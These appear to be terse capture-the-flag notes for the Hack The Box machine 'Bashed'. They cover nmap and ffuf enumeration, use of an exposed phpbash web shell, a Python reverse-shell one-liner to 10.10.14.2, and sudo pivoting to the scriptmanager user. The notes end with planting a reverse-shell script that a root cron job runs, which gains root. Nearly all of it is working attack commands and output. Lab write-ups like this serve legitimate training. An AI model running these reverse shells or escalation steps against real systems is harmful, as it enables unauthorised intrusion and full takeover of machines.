nmap
```
$ sudo nmap -sC -sV 10.10.10.68

Nmap scan report for 10.10.10.68
Host is up (0.040s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

ffuf
```
$ ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.68/FUZZ

.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10]
```

go to http://10.10.10.68/dev/phpbash.php

exploit: manual
```
$ nc -lnvp 9001

export RHOST="10.10.14.2";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

$ python -c 'import pty;pty.spawn("/bin/bash")'

www-data@bashed:/var/www/html$ sudo -l

Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

www-data@bashed:/var/www/html$ sudo -u scriptmanager /bin/bash

scriptmanager@bashed:/var/www/html$ id

uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)

scriptmanager@bashed:/var/www/html$ find / -user scriptmanager 2> /dev/null | grep -v proc

/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout

scriptmanager@bashed:/var/www/html$ cd /scripts

scriptmanager@bashed:/scripts$ ls -la

total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jul  9 00:45 test.txt

#pspy (cronjobs)
scriptmanager@bashed:/dev/shm$ ./pspy64

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     


<snip>                                                  
2021/07/09 01:06:01 CMD: UID=0    PID=1110   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done

#create a python script named shell.py in /scripts
scriptmanager@bashed:/scripts$ vim shell.py 

import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.2",9002));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

p=subprocess.call(["/bin/sh","-i"]);

$ nc -lnvp 9002

# id
uid=0(root) gid=0(root) groups=0(root)
```